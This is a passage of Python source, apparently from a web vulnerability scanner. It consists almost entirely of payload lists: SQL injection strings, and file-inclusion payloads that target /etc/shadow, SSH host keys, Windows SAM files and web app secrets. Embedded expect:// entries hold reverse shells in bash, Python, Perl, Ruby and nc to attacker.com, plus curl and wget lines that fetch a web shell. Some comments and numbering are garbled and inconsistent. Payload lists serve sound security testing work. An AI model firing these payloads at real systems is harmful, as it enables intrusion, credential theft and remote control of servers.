        ("' AND 1=1 AND SLEEP(0)--", "SQLi Combined Blind Time"),
        ("' OR 1=1 OR SLEEP(0)--", "SQLi Combined OR Time"),
        ("' AND 1=1 UNION SELECT NULL--", "SQLi Combined Blind Union"),
        ("' OR 1=1 UNION SELECT NULL--", "SQLi Combined OR Union"),
        ("' AND SLEEP(0) AND 1=1--", "SQLi Combined Time Blind"),
        ("' AND SLEEP(0) OR 1=1--", "SQLi Combined Time OR"),
        ("' AND (SELECT 1 FROM (SELECT SLEEP(0)) AS a)--", "SQLi Combined Nested"),
        ("' AND IF(1=1, SLEEP(0), 0) AND 1=1--", "SQLi Combined IF"),
        ("' OR IF(1=1, SLEEP(0), 0) OR 1=1--", "SQLi Combined OR IF"),
        ("' UNION SELECT NULL AND SLEEP(0)--", "SQLi Combined Union Time"),
        ("' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) AS a)>0--", "SQLi Combined Union Count"),
        ("' AND (SELECT COUNT(*) FROM (SELECT SLEEP(0)) AS a)>0--", "SQLi Combined Time Count"),
        ("' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(SLEEP(0),FLOOR(RAND()*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)--", "SQLi Combined Duplicate"),
        ("' AND extractvalue(1,concat(0x7e,SLEEP(0)))--", "SQLi Combined Error Time"),
        ("' AND updatexml(1,concat(0x7e,SLEEP(0)),1)--", "SQLi Combined Error Time2"),
        ("' AND 1=CAST(SLEEP(0) AS INT)--", "SQLi Combined Cast Time"),
        ("' AND 1=CONVERT(INT, SLEEP(0))--", "SQLi Combined Convert Time"),
        ("' AND 1=(SELECT TOP 1 SLEEP(0) FROM sysobjects)--", "SQLi Combined MSSQL Time"),
        ("' AND 1=(SELECT @@VERSION WHERE SLEEP(0)>0)--", "SQLi Combined Version Time"),
        ("' AND 1=(SELECT user() WHERE SLEEP(0)>0)--", "SQLi Combined User Time"),
    
        # Final coverage (81-80 already done, adding last 0 to reach 1000)
        ("' ODER BY 1--", "SQLi Typo ODER"),
        ("' UNON SELECT NULL--", "SQLi Typo UNON"),
        ("' WERE 1=1--", "SQLi Typo WERE"),
        ("' FROUM users--", "SQLi Typo FROUM"),
        ("' INSART INTO--", "SQLi Typo INSART"),
        ("' UPDETE users--", "SQLi Typo UPDETE"),
        ("' DELATE FROM--", "SQLi Typo DELATE"),
        ("' DROUP TABLE--", "SQLi Typo DROUP"),
        ("' CREAT TABLE--", "SQLi Typo CREAT"),
        ("' SLEEPPY(3)--", "SQLi Typo SLEEPPY"),
    ]
    
    # ─── LFI Payloads — 40+ vectors ──────────────────────────────────────
    LFI_PAYLOADS = [
    # ==================== 1-50: BASIC TRAVERSAL ====================
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../../../../../etc/passwd',
        '../../../../../../../etc/passwd',
        '../../../../../../../../etc/passwd',
        '../../../../../../../../../etc/passwd',
        '../../../../../../../../../../etc/passwd',
        '../../../../../../../../../../../etc/passwd',
        '../../../../../../../../../../../../etc/passwd',
        '....//....//....//etc/passwd',
        '....//....//....//....//etc/passwd',
        '....//....//....//....//....//etc/passwd',
        '..;/..;/..;/etc/passwd',
        '..;/..;/..;/..;/etc/passwd',
        '..;/..;/..;/..;/..;/etc/passwd',
        '..\\..\\..\\etc\\passwd',
        '..\\..\\..\\..\\etc\\passwd',
        '..\\..\\..\\..\\..\\etc\\passwd',
        '..\\..\\..\\..\\..\\..\\etc\\passwd',
        '..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
        '..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
        '/etc/passwd',
        '/etc/passwd/',
        '/etc/passwd/.',
        '/etc/passwd/..',
        '/etc/passwd/../',
        '/etc/passwd/%00',
        '/etc/passwd%00',
        '/etc/passwd%00.html',
        '/etc/passwd#',
        '/etc/passwd?',
        '/etc/passwd/.//',
        '/etc/passwd/././',
        '/etc/passwd/../',
        '/etc/passwd/..//',
        '/etc/passwd/../..//',
        '/etc//passwd',
        '/etc/./passwd',
        '/etc/../etc/passwd',
        '/etc/./../etc/passwd',
        '/etc/../etc/../etc/passwd',
        '/etc/passwd%20',
        '/etc/passwd%09',
        '/etc/passwd%0a',
        '/etc/passwd%0d',
        '/etc/passwd%0b',
        '/etc/passwd%0c',
        '/etc/passwd%00%00',
        '/etc/passwd%00%00%00',
        
        # ==================== 51-100: MORE LINUX FILES ====================
        '/etc/hostname',
        '/etc/hosts',
        '/etc/hosts.allow',
        '/etc/hosts.deny',
        '/etc/issue',
        '/etc/issue.net',
        '/etc/motd',
        '/etc/network/interfaces',
        '/etc/resolv.conf',
        '/etc/fstab',
        '/etc/mtab',
        '/etc/group',
        '/etc/shadow',
        '/etc/gshadow',
        '/etc/sudoers',
        '/etc/crontab',
        '/etc/cron.d/',
        '/etc/cron.daily/',
        '/etc/cron.hourly/',
        '/etc/cron.weekly/',
        '/etc/cron.monthly/',
        '/etc/passwd-',
        '/etc/shadow-',
        '/etc/security/passwd',
        '/etc/security/shadow',
        '/etc/security/opasswd',
        '/etc/security/group',
        '/etc/security/gshadow',
        '/etc/security/limits.conf',
        '/etc/security/access.conf',
        '/etc/ssh/sshd_config',
        '/etc/ssh/ssh_config',
        '/etc/ssh/ssh_host_key',
        '/etc/ssh/ssh_host_rsa_key',
        '/etc/ssh/ssh_host_dsa_key',
        '/etc/ssh/ssh_host_ecdsa_key',
        '/etc/ssh/ssh_host_ed25519_key',
        '/etc/my.cnf',
        '/etc/mysql/my.cnf',
        '/etc/mysql/mysql.conf.d/mysqld.cnf',
        '/var/lib/mysql/mysql/user.MYD',
        '/var/lib/mysql/mysql/user.MYI',
        '/var/lib/mysql/mysql/user.frm',
        '/var/lib/mysql/user.myd',
        '/var/lib/mysql/user.myi',
        '/var/log/messages',
        '/var/log/syslog',
        '/var/log/auth.log',
        '/var/log/secure',
        '/var/log/maillog',
        '/var/log/mail.log',
        
        # ==================== 101-150: WINDOWS PATHS ====================
        '../../../windows/win.ini',
        '../../../../windows/win.ini',
        '../../../../../windows/win.ini',
        '../../../../../../windows/win.ini',
        '....\\....\\....\\windows\\win.ini',
        '....\\....\\....\\....\\windows\\win.ini',
        '....\\....\\....\\....\\....\\windows\\win.ini',
        'C:\\Windows\\win.ini',
        'C:\\windows\\win.ini',
        'C:\\WINNT\\win.ini',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\Windows\\System32\\drivers\\etc\\hosts.old',
        'C:\\Windows\\System32\\drivers\\etc\\networks',
        'C:\\Windows\\System32\\drivers\\etc\\protocol',
        'C:\\Windows\\System32\\drivers\\etc\\services',
        'C:\\Windows\\System32\\config\\AppEvent.Evt',
        'C:\\Windows\\System32\\config\\SecEvent.Evt',
        'C:\\Windows\\System32\\config\\SysEvent.Evt',
        'C:\\Windows\\System32\\config\\SAM',
        'C:\\Windows\\System32\\config\\SYSTEM',
        'C:\\Windows\\System32\\config\\SOFTWARE',
        'C:\\Windows\\System32\\config\\SECURITY',
        'C:\\Windows\\System32\\config\\DEFAULT',
        'C:\\Windows\\repair\\SAM',
        'C:\\Windows\\repair\\SYSTEM',
        'C:\\Windows\\repair\\SOFTWARE',
        'C:\\Windows\\repair\\SECURITY',
        'C:\\Windows\\repair\\DEFAULT',
        'C:\\boot.ini',
        'C:\\boot.ini%00',
        'C:\\autoexec.bat',
        'C:\\config.sys',
        'C:\\pagefile.sys',
        'C:\\hiberfil.sys',
        'C:\\Windows\\System32\\inetsrv\\metabase.xml',
        'C:\\Windows\\System32\\inetsrv\\MetaBase.bin',
        'C:\\Windows\\System32\\inetsrv\\history\\',
        'C:\\Windows\\System32\\LogFiles\\W3SVC1\\',
        'C:\\Windows\\System32\\LogFiles\\HTTPERR\\',
        'C:\\Windows\\System32\\winevt\\Logs\\Application.evtx',
        'C:\\Windows\\System32\\winevt\\Logs\\Security.evtx',
        'C:\\Windows\\System32\\winevt\\Logs\\System.evtx',
        'C:\\inetpub\\wwwroot\\web.config',
        'C:\\inetpub\\wwwroot\\global.asax',
        'C:\\inetpub\\wwwroot\\index.aspx',
        'C:\\xampp\\apache\\conf\\httpd.conf',
        'C:\\xampp\\apache\\conf\\extra\\httpd-vhosts.conf',
        'C:\\xampp\\php\\php.ini',
        'C:\\xampp\\phpMyAdmin\\config.inc.php',
        'C:\\Program Files\\MySQL\\my.ini',
        'C:\\Program Files (x86)\\MySQL\\my.ini',
        
        # ==================== 151-200: PHP WRAPPERS ====================
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/read=convert.base64-encode/resource=index.php',
        'php://filter/convert.base64-encode/resource=/etc/passwd',
        'php://filter/read=convert.base64-encode/resource=/etc/passwd',
        'php://filter/convert.base64-encode/resource=../index.php',
        'php://filter/read=convert.base64-encode/resource=../index.php',
        'php://filter/convert.base64-decode/resource=index.php',
        'php://filter/read=convert.base64-decode/resource=index.php',
        'php://filter/string.rot13/resource=index.php',
        'php://filter/read=string.rot13/resource=index.php',
        'php://filter/convert.quoted-printable-encode/resource=index.php',
        'php://filter/convert.iconv.utf-8.utf-16/resource=index.php',
        'php://filter/convert.iconv.utf-8.utf-7/resource=index.php',
        'php://filter/convert.iconv.utf-8.utf-16le/resource=index.php',
        'php://filter/convert.iconv.utf-8.utf-16be/resource=index.php',
        'php://filter/zlib.deflate/resource=index.php',
        'php://filter/zlib.inflate/resource=index.php',
        'php://filter/string.strip_tags/resource=index.php',
        'php://filter/string.tolower/resource=index.php',
        'php://filter/string.toupper/resource=index.php',
        'php://filter/string.quoted-printable-decode/resource=index.php',
        'php://input',
        'php://input%00',
        'php://input/',
        'php://stdin',
        'php://stdout',
        'php://stderr',
        'php://fd/0',
        'php://fd/1',
        'php://fd/2',
        'php://fd/3',
        'php://fd/4',
        'php://fd/5',
        'php://fd/10',
        'php://memory',
        'php://temp',
        'php://temp/maxmemory:1024',
        'phar://',
        'phar://test.phar',
        'phar:///path/to/file.phar/test.txt',
        'phar://../file.phar/test.txt',
        'zip://',
        'zip://file.zip#internal.txt',
        'zip:///path/to/file.zip#internal.txt',
        'zip://../file.zip#internal.txt',
        'bzip2://',
        'zlib://',
        'glob://',
        'ssh2://',
        'rar://',
        'ogg://',
        'expect://',
        
        # ==================== 201-250: DATA/EXPECT WRAPPERS ====================
        'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+',
        'data://text/plain;base64,PD9waHAgZWNobyAnWFNTJzsgPz4=',
        'data://text/plain;base64,PD9waHAgcmVhZGZpbGUoJy9ldGMvcGFzc3dkJyk7ID8+',
        'data://text/plain,<?php phpinfo(); ?>',
        'data://text/plain,<?php system("id"); ?>',
        'data://text/plain,<?php echo "XSS"; ?>',
        'data://text/plain,<?php readfile("/etc/passwd"); ?>',
        'data://text/html,<script>alert(1)</script>',
        'data://text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'data://text/plain,<svg onload=alert(1)>',
        'data://text/plain;charset=utf-8,<?php phpinfo(); ?>',
        'data://text/plain;charset=us-ascii,<?php phpinfo(); ?>',
        'expect://whoami',
        'expect://id',
        'expect://ls',
        'expect://pwd',
        'expect://cat /etc/passwd',
        'expect://uname -a',
        'expect://ifconfig',
        'expect://netstat -an',
        'expect://ps aux',
        'expect://w',
        'expect://last',
        'expect://df -h',
        'expect://free -m',
        'expect://uptime',
        'expect://date',
        'expect://cal',
        'expect://echo "hacked"',
        'expect://php -v',
        'expect://python --version',
        'expect://perl -v',
        'expect://ruby -v',
        'expect://node -v',
        'expect://gcc --version',
        'expect://make --version',
        'expect://git --version',
        'expect://curl --version',
        'expect://wget --version',
        'expect://nc -zv attacker.com 4444',
        'expect://bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"',
        'expect://python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'attacker.com\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"',
        'expect://perl -e "use Socket;$i=\'attacker.com\';$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\'tcp\'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\'/bin/sh -i\');}"',
        'expect://ruby -rsocket -e "c=TCPSocket.new(\'attacker.com\',\'4444\');while(cmd=c.gets);IO.popen(cmd,\'r\'){|io|c.print io.read}end"',
        'expect://nc -e /bin/sh attacker.com 4444',
        'expect://telnet attacker.com 4444',
        
        # ==================== 251-300: LOG FILE INJECTION ====================
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/log/apache2/other_vhosts_access.log',
        '/var/log/apache2/access.log.1',
        '/var/log/apache2/error.log.1',
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        '/var/log/nginx/access.log.1',
        '/var/log/nginx/error.log.1',
        '/var/log/httpd/access_log',
        '/var/log/httpd/error_log',
        '/var/log/httpd/ssl_access_log',
        '/var/log/httpd/ssl_error_log',
        '/var/log/httpd/ssl_request_log',
        '/var/log/lighttpd/access.log',
        '/var/log/lighttpd/error.log',
        '/usr/local/apache/logs/access_log',
        '/usr/local/apache/logs/error_log',
        '/usr/local/apache2/logs/access_log',
        '/usr/local/apache2/logs/error_log',
        '/usr/local/httpd/logs/access_log',
        '/usr/local/httpd/logs/error_log',
        '/opt/bitnami/apache2/logs/access_log',
        '/opt/bitnami/apache2/logs/error_log',
        '/var/log/maillog',
        '/var/log/mail.log',
        '/var/log/mail.err',
        '/var/log/mail.warn',
        '/var/log/procmail.log',
        '/var/log/syslog',
        '/var/log/messages',
        '/var/log/auth.log',
        '/var/log/secure',
        '/var/log/kern.log',
        '/var/log/user.log',
        '/var/log/debug',
        '/var/log/daemon.log',
        '/var/log/boot.log',
        '/var/log/dmesg',
        '/var/log/dpkg.log',
        '/var/log/apt/history.log',
        '/var/log/apt/term.log',
        '/var/log/alternatives.log',
        '/var/log/cron.log',
        '/var/log/faillog',
        '/var/log/lastlog',
        '/var/log/wtmp',
        '/var/log/btmp',
        '/var/log/lastlog',
        '/var/log/utmp',
        '/var/log/audit/audit.log',
        '/proc/self/environ',
        '/proc/self/environ%00',
        '/proc/self/environ%00.html',
        '/proc/self/environ/%00',
        '/proc/self/environ/.',
        '/proc/self/environ/..',
        '/proc/self/environ/../',
        
        # ==================== 301-350: PROC FILESYSTEM ====================
        '/proc/self/cmdline',
        '/proc/self/status',
        '/proc/self/stat',
        '/proc/self/statm',
        '/proc/self/maps',
        '/proc/self/mem',
        '/proc/self/limits',
        '/proc/self/cgroup',
        '/proc/self/mountinfo',
        '/proc/self/mounts',
        '/proc/self/mountstats',
        '/proc/self/net/dev',
        '/proc/self/net/route',
        '/proc/self/net/tcp',
        '/proc/self/net/udp',
        '/proc/self/net/unix',
        '/proc/self/fd/0',
        '/proc/self/fd/1',
        '/proc/self/fd/2',
        '/proc/self/fd/3',
        '/proc/self/fd/4',
        '/proc/self/fd/5',
        '/proc/self/fd/6',
        '/proc/self/fd/7',
        '/proc/self/fd/8',
        '/proc/self/fd/9',
        '/proc/self/fd/10',
        '/proc/self/fd/99',
        '/proc/self/fd/100',
        '/proc/self/fd/255',
        '/proc/self/fdinfo/0',
        '/proc/self/fdinfo/1',
        '/proc/self/fdinfo/2',
        '/proc/version',
        '/proc/version_signature',
        '/proc/sys/kernel/version',
        '/proc/sys/kernel/hostname',
        '/proc/sys/kernel/domainname',
        '/proc/sys/kernel/osrelease',
        '/proc/sys/kernel/ostype',
        '/proc/sys/kernel/pid_max',
        '/proc/sys/kernel/random/uuid',
        '/proc/sys/kernel/random/boot_id',
        '/proc/sys/kernel/random/entropy_avail',
        '/proc/cpuinfo',
        '/proc/meminfo',
        '/proc/loadavg',
        '/proc/uptime',
        '/proc/diskstats',
        '/proc/partitions',
        '/proc/filesystems',
        '/proc/interrupts',
        '/proc/iomem',
        '/proc/ioports',
        '/proc/buddyinfo',
        '/proc/pagetypeinfo',
        '/proc/zoneinfo',
        '/proc/slabinfo',
        '/proc/vmstat',
        '/proc/swaps',
        '/proc/stat',
        '/proc/locks',
        '/proc/mounts',
        '/proc/sysrq-trigger',
        '/proc/kmsg',
        '/proc/kcore',
        
        # ==================== 351-400: ENCODED PAYLOADS ====================
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%252f..%252f..%252f..%252fetc%252fpasswd',
        '..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
        '..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
        '..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
        '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
        '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
        '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
        '..%25%32%65%25%32%65%25%32%66..%25%32%65%25%32%65%25%32%66etc%25%32%66passwd',
        '..%25%32%65%25%32%65%25%32%66..%25%32%65%25%32%65%25%32%66..%25%32%65%25%32%65%25%32%66etc%25%32%66passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64%00',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00.html',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00.jpg',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00.png',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00.gif',
        '..%252f..%252f..%252fetc%252fpasswd%2500',
        '..%252f..%252f..%252fetc%252fpasswd%252e%252e%252f',
        '..%252f..%252f..%252fetc%252fpasswd%252e%252e',
        '..%252f..%252f..%252fetc%252fpasswd%252e%252e%252f%252e%252e%252f',
        '..%c0%ae%c0%ae%c0%af..%c0%ae%c0%ae%c0%afetc%c0%afpasswd',
        '..%c0%ae%c0%ae%c0%af..%c0%ae%c0%ae%c0%af..%c0%ae%c0%ae%c0%afetc%c0%afpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64%2e%2e%2f',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64%2e%2e%2f%2e%2e%2f',
        '..\\..\\..\\etc\\passwd',
        '..\\..\\..\\..\\etc\\passwd',
        '..\\..\\..\\..\\..\\etc\\passwd',
        '..\\..\\..\\windows\\win.ini',
        '..\\..\\..\\..\\windows\\win.ini',
        '..\\..\\..\\..\\..\\windows\\win.ini',
        '%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd',
        '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd',
        '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd',
        '..%252f..%252f..%252fetc%252fpasswd%252f..',
        '..%252f..%252f..%252fetc%252fpasswd%252f..%252f',
        '..%252f..%252f..%252fetc%252fpasswd%252f..%252f..%252f',
        '..%252f..%252f..%252fetc%252fpasswd%252f..%252f..%252f..%252f',
        
        # ==================== 401-450: NULL BYTE & TRUNCATION ====================
        '../../../etc/passwd%00',
        '../../../../etc/passwd%00',
        '../../../../../etc/passwd%00',
        '../../../../../../etc/passwd%00',
        '../../../etc/passwd%00.html',
        '../../../etc/passwd%00.jpg',
        '../../../etc/passwd%00.png',
        '../../../etc/passwd%00.gif',
        '../../../etc/passwd%00.php',
        '../../../etc/passwd%00.txt',
        '../../../etc/passwd%00;',
        '../../../etc/passwd%00?',
        '../../../etc/passwd%00#',
        '../../../etc/passwd%00/',
        '../../../etc/passwd%00\\',
        '../../../etc/passwd%00%00',
        '../../../etc/passwd%00%00%00',
        '../../../etc/passwd%00\x00',
        '../../../etc/passwd\x00',
        '../../../etc/passwd\x00.html',
        '../../../etc/passwd\x00.jpg',
        '../../../etc/passwd\x00.png',
        '../../../etc/passwd\x00.gif',
        '../../../etc/passwd\x00.php',
        '../../../etc/passwd\x00.txt',
        '../../../etc/passwd\x00;',
        '../../../etc/passwd\x00?',
        '../../../etc/passwd\x00#',
        '../../../etc/passwd\x00/',
        '../../../etc/passwd\x00\\',
        '../../../etc/passwd\x00\x00',
        '..%00..%00..%00etc%00passwd',
        '..%00..%00..%00etc%00passwd%00',
        '..%00..%00..%00etc%00passwd%00.html',
        '..%00..%00..%00..%00etc%00passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00.html',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00.php',
        '../../../etc/passwd%20%00',
        '../../../etc/passwd%09%00',
        '../../../etc/passwd%0a%00',
        '../../../etc/passwd%0d%00',
        '../../../etc/passwd%0b%00',
        '../../../etc/passwd%0c%00',
        '../../../etc/passwd%00%20',
        '../../../etc/passwd%00%09',
        '../../../etc/passwd%00%0a',
        '../../../etc/passwd%00%0d',
        '../../../etc/passwd%00%0b',
        '../../../etc/passwd%00%0c',
        '../../../etc/passwd%00%2e%2e%2f',
        '../../../etc/passwd%00%2e%2e%2f%2e%2e%2f',
        
        # ==================== 451-500: PHP INPUT/COMMAND INJECTION ====================
        'php://input',
        'php://input%00',
        'php://input/',
        'php://input#',
        'php://input?',
        'php://input;',
        'php://filter/convert.base64-encode/resource=php://input',
        'php://filter/read=convert.base64-encode/resource=php://input',
        'php://filter/convert.base64-encode/resource=php://input%00',
        'php://filter/read=convert.base64-encode/resource=php://input%00',
        'php://temp',
        'php://temp/maxmemory:0',
        'php://temp/maxmemory:1024',
        'php://temp/maxmemory:2048',
        'php://temp/maxmemory:4096',
        'php://temp/maxmemory:8192',
        'php://memory',
        'php://memory/maxmemory:0',
        'php://memory/maxmemory:1024',
        'php://memory/maxmemory:2048',
        'php://memory/maxmemory:4096',
        'php://memory/maxmemory:8192',
        'expect://id',
        'expect://ls -la',
        'expect://pwd',
        'expect://whoami',
        'expect://cat /etc/passwd',
        'expect://head /etc/passwd',
        'expect://tail /etc/passwd',
        'expect://grep root /etc/passwd',
        'expect://find / -name "*.php" 2>/dev/null',
        'expect://ps aux',
        'expect://netstat -an',
        'expect://ss -tuln',
        'expect://lsof -i',
        'expect://ifconfig',
        'expect://ip addr',
        'expect://route -n',
        'expect://df -h',
        'expect://du -sh /*',
        'expect://free -m',
        'expect://top -b -n 1',
        'expect://uptime',
        'expect://date',
        'expect://cal',
        'expect://echo "<?php eval($_GET[cmd]); ?>" > shell.php',
        'expect://curl http://attacker.com/shell.php -o shell.php',
        'expect://wget http://attacker.com/shell.php -O shell.php',
        'expect://nc -e /bin/sh attacker.com 4444',
        'expect://bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"',
        'expect://python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'attacker.com\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"',
        
        # ==================== 501-550: SERVER FILES (WEB CONFIG) ====================
        '/etc/apache2/apache2.conf',
        '/etc/apache2/ports.conf',
        '/etc/apache2/sites-available/000-default.conf',
        '/etc/apache2/sites-available/default-ssl.conf',
        '/etc/apache2/sites-enabled/000-default.conf',
        '/etc/apache2/sites-enabled/default-ssl.conf',
        '/etc/httpd/conf/httpd.conf',
        '/etc/httpd/conf.d/ssl.conf',
        '/usr/local/etc/apache22/httpd.conf',
        '/usr/local/etc/apache22/extra/httpd-vhosts.conf',
        '/usr/local/etc/apache24/httpd.conf',
        '/usr/local/etc/apache24/extra/httpd-vhosts.conf',
        '/etc/nginx/nginx.conf',
        '/etc/nginx/sites-available/default',
        '/etc/nginx/sites-enabled/default',
        '/etc/nginx/conf.d/default.conf',
        '/usr/local/nginx/conf/nginx.conf',
        '/usr/local/nginx/conf/vhosts.conf',
        '/etc/lighttpd/lighttpd.conf',
        '/etc/lighttpd/vhosts.conf',
        '/etc/php/php.ini',
        '/etc/php5/apache2/php.ini',
        '/etc/php5/cli/php.ini',
        '/etc/php5/fpm/php.ini',
        '/etc/php7/apache2/php.ini',
        '/etc/php7/cli/php.ini',
        '/etc/php7/fpm/php.ini',
        '/etc/php8/apache2/php.ini',
        '/etc/php8/cli/php.ini',
        '/etc/php8/fpm/php.ini',
        '/usr/local/lib/php.ini',
        '/usr/local/php/lib/php.ini',
        '/var/www/html/.htaccess',
        '/var/www/html/.htpasswd',
        '/var/www/html/config.php',
        '/var/www/html/config.inc.php',
        '/var/www/html/configuration.php',
        '/var/www/html/settings.php',
        '/var/www/html/wp-config.php',
        '/var/www/html/wp-config-sample.php',
        '/var/www/html/.env',
        '/var/www/html/.git/config',
        '/var/www/html/.gitignore',
        '/var/www/html/composer.json',
        '/var/www/html/composer.lock',
        '/var/www/html/package.json',
        '/var/www/html/package-lock.json',
        '/var/www/html/web.config',
        '/var/www/html/robots.txt',
        '/var/www/html/sitemap.xml',
        '/var/www/html/phpinfo.php',
        
        # ==================== 551-600: MORE WEB CONFIG FILES ====================
        '/var/www/html/upload/.htaccess',
        '/var/www/html/images/.htaccess',
        '/var/www/html/css/.htaccess',
        '/var/www/html/js/.htaccess',
        '/var/www/html/admin/.htaccess',
        '/var/www/html/admin/config.php',
        '/var/www/html/admin/config.inc.php',
        '/var/www/html/admin/settings.php',
        '/var/www/html/inc/config.php',
        '/var/www/html/includes/config.php',
        '/var/www/html/include/config.php',
        '/var/www/html/conf/config.php',
        '/var/www/html/configuration/config.php',
        '/var/www/html/app/config.php',
        '/var/www/html/application/config.php',
        '/var/www/html/config/database.php',
        '/var/www/html/config/db.php',
        '/var/www/html/config/config.php',
        '/var/www/html/config.inc.php',
        '/var/www/html/conf.inc.php',
        '/var/www/html/settings.inc.php',
        '/var/www/html/config.yml',
        '/var/www/html/config.yaml',
        '/var/www/html/config.json',
        '/var/www/html/config.xml',
        '/var/www/html/database.yml',
        '/var/www/html/database.yaml',
        '/var/www/html/database.json',
        '/var/www/html/database.xml',
        '/var/www/html/.htpasswd',
        '/var/www/html/.htusers',
        '/var/www/html/.passwd',
        '/var/www/html/.credentials',
        '/var/www/html/credentials.txt',
        '/var/www/html/passwords.txt',
        '/var/www/html/users.txt',
        '/var/www/html/admin.txt',
        '/var/www/html/backup.sql',
        '/var/www/html/dump.sql',
        '/var/www/html/db_backup.sql',
        '/var/www/html/database.sql',
        '/var/www/html/sql/dump.sql',
        '/var/www/html/backup/database.sql',
        '/var/www/html/.bash_history',
        '/var/www/html/.history',
        '/var/www/html/.mysql_history',
        '/var/www/html/.psql_history',
        '/home/www-data/.bash_history',
        '/home/www-data/.history',
        '/root/.bash_history',
        '/root/.mysql_history',
        '/root/.psql_history',
        
        # ==================== 601-650: DATABASE FILES ====================
        '/var/lib/mysql/mysql/user.frm',
        '/var/lib/mysql/mysql/user.MYD',
        '/var/lib/mysql/mysql/user.MYI',
        '/var/lib/mysql/mysql/user.ibd',
        '/var/lib/mysql/mysql/db.frm',
        '/var/lib/mysql/mysql/db.MYD',
        '/var/lib/mysql/mysql/db.MYI',
        '/var/lib/mysql/mysql/columns_priv.frm',
        '/var/lib/mysql/mysql/columns_priv.MYD',
        '/var/lib/mysql/mysql/columns_priv.MYI',
        '/var/lib/mysql/mysql/tables_priv.frm',
        '/var/lib/mysql/mysql/tables_priv.MYD',
        '/var/lib/mysql/mysql/tables_priv.MYI',
        '/var/lib/mysql/mysql/procs_priv.frm',
        '/var/lib/mysql/mysql/procs_priv.MYD',
        '/var/lib/mysql/mysql/procs_priv.MYI',
        '/var/lib/mysql/performance_schema/',
        '/var/lib/mysql/ibdata1',
        '/var/lib/mysql/ib_logfile0',
        '/var/lib/mysql/ib_logfile1',
        '/var/lib/mysql/aria_log.00000001',
        '/var/lib/mysql/aria_log_control',
        '/var/lib/mysql/master.info',
        '/var/lib/mysql/relay-log.info',
        '/var/lib/mysql/mysql-bin.index',
        '/var/lib/mysql/mysql-bin.000001',
        '/var/lib/mysql/mysql-bin.000002',
        '/var/lib/mysql/mysql-bin.000003',
        '/usr/local/var/mysql/mysql/user.frm',
        '/usr/local/var/mysql/mysql/user.MYD',
        '/usr/local/var/mysql/mysql/user.MYI',
        '/opt/bitnami/mysql/data/mysql/user.frm',
        '/opt/bitnami/mysql/data/mysql/user.MYD',
        '/opt/bitnami/mysql/data/mysql/user.MYI',
        '/var/lib/pgsql/data/pg_hba.conf',
        '/var/lib/pgsql/data/pg_ident.conf',
